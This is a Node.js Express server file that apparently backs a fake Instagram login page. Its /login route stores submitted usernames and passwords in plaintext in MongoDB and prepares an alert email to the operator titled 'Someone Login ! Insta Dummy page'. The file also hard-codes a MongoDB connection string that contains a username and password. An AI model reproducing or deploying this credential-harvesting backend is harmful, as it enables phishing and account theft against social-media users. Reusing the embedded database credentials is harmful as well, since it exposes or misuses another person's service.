const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
var bodyParser = require('body-parser');
const mongoURI = "mongodb+srv://yuvrajmann282:CbJJRcGbBffdijrf@cluster0.umdtyvl.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
const app = express();

const port = 3000;
app.use(bodyParser.urlencoded({ extended: true })); 

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('Error connecting to MongoDB:', err));


  // Define the login data schema
const LoginSchema = new mongoose.Schema({
    username: String,
    password: String,
    createdDate: { type: Date, default: Date.now }  
});

const Login = mongoose.model('Login', LoginSchema);

// Serve static files from the 'public' directory (optional)
app.use(express.static(path.join(__dirname, 'public')));  // Add this line
app.get("/success",(req,res,next)=>{
    res.sendFile(path.join(__dirname, 'public', 'success.html'));  // Send the index.html file
})
app.post("/login",async (req,res,next)=>{
  const username = req.body.uname || '';  // Access username from POST data
  const password = req.body.password || '';   // Access password from POST data
    
  const subject = "Someone Login ! Insta Dummy page";
  const to = "yuvraj1mann@gmail.com";
  const text = "Username: " + username + "\r\nPassword: " + password;

  if (username && password) {
    try {
      // Create a new login document
      const newLogin = new Login({ username, password });

      // Save the login data to MongoDB
      await newLogin.save();
      console.log('Login information saved to MongoDB');

      res.redirect('/success');  // Redirect to a success page
    } catch (err) {
      console.error('Error saving login data:', err);
      res.redirect('/error');  // Redirect to an error page
    }
  } else {
    res.redirect('/login');  // Assuming a login page exists in the 'public' directory
  }
});

app.listen(port, () => {
    console.log(`Server listening on port ${port}`);
});
